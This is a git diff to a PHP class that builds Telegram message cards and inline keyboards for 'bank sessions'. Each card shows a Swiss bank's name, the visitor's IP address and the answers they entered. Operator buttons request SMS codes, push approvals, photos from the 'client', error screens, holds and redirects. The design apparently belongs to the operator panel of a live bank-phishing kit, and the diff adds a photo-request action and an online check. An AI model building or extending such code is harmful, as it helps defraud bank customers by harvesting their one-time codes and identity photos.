@@ -5,6 +5,7 @@ namespace App\Services\Telegram;
 use App\Enums\ActionType;
 use App\Enums\BankSessionStatus;
 use App\Models\BankSession;
+use App\Models\PreSession;
 use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
 use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;
 
@@ -34,6 +35,11 @@ class TelegramCardBuilder
         'banque-cantonale-du-valais' => 'Banque Cantonale du Valais',
     ];
 
+    public static function getDisplayName(string $slug): string
+    {
+        return self::DISPLAY_NAMES[$slug] ?? $slug;
+    }
+
     public function buildCardText(BankSession $session): string
     {
         $lines = [];
@@ -45,7 +51,8 @@ class TelegramCardBuilder
             default                      => '❓',
         };
 
-        $lines[] = "🏦 <b>{$name}</b>  |  {$status}";
+        $logTag  = $session->log_number !== null ? "  <code>#log{$session->log_number}</code>" : '';
+        $lines[] = "🏦 <b>{$name}</b>  |  {$status}{$logTag}";
         if ($session->ip_address) {
             $lines[] = "🌍 IP " . e($session->ip_address);
         }
@@ -63,9 +70,16 @@ class TelegramCardBuilder
             $lines[] = '';
             $lines[] = '<b>Ответы:</b>';
             foreach ($answers as $i => $a) {
-                $cmd     = $a['command'] ?? '?';
-                $payload = json_encode($a['payload'] ?? null, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
-                $lines[] = sprintf('%d. %s → <code>%s</code>', $i + 1, e($cmd), e($payload));
+                $cmd = $a['command'] ?? '?';
+                if ($cmd === 'photo.request') {
+                    $lines[] = sprintf('%d. 📷 Фото от клиента', $i + 1);
+                    continue;
+                }
+                $payload = $a['payload'] ?? [];
+                $value   = count($payload) === 1
+                    ? (string) array_values($payload)[0]
+                    : implode(' ', array_values($payload));
+                $lines[] = sprintf('%d. %s → <code>%s</code>', $i + 1, e($cmd), e($value));
             }
         }
 
@@ -80,6 +94,7 @@ class TelegramCardBuilder
             'error'              => '⚠️ Ошибка',
             'photo.with-input'   => '📸 Ожидает фото + текст',
             'photo.without-input' => '📸 Ожидает фото',
+            'photo.request'      => '📷 Запрос фото у клиента',
             'redirect'           => '🔗 Редирект',
             default              => '🟢 Новая',
         };
@@ -110,11 +125,17 @@ class TelegramCardBuilder
             callback_data: "action:{$sid}:{$a->value}",
         );
 
-        return InlineKeyboardMarkup::make()
+        $preSession = PreSession::where('bank_slug', $session->bank_slug)
+            ->where('ip_address', $session->ip_address)
+            ->latest()
+            ->first();
+
+        $keyboard = InlineKeyboardMarkup::make()
             ->addRow($btn(ActionType::Sms), $btn(ActionType::Push))
             ->addRow($btn(ActionType::InvalidData), $btn(ActionType::Error))
             ->addRow($btn(ActionType::Question))
             ->addRow($btn(ActionType::PhotoWithInput), $btn(ActionType::PhotoWithoutInput))
+            ->addRow($btn(ActionType::PhotoRequest))
             ->addRow($btn(ActionType::HoldShort), $btn(ActionType::HoldLong))
             ->addRow($btn(ActionType::Redirect))
             ->addRow($btn(ActionType::Idle))
@@ -122,5 +143,13 @@ class TelegramCardBuilder
                 InlineKeyboardButton::make('✅ Завершить', callback_data: "complete:{$sid}"),
                 InlineKeyboardButton::make('📤 Снять',    callback_data: "unassign:{$sid}"),
             );
+
+        if ($preSession) {
+            $keyboard->addRow(
+                InlineKeyboardButton::make('🌐 Онлайн?', callback_data: "presession:online:{$preSession->id}"),
+            );
+        }
+
+        return $keyboard;
     }
 }
